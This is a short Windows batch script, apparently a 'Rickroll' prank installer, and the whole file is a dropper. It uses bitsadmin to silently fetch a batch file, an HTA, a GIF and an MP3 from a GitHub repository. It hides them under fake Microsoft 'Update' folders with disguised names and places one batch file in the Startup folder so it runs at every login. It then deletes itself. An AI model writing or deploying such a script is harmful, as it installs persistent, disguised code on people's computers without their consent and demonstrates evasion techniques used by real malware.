@echo off

cls

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"

del startup.bat
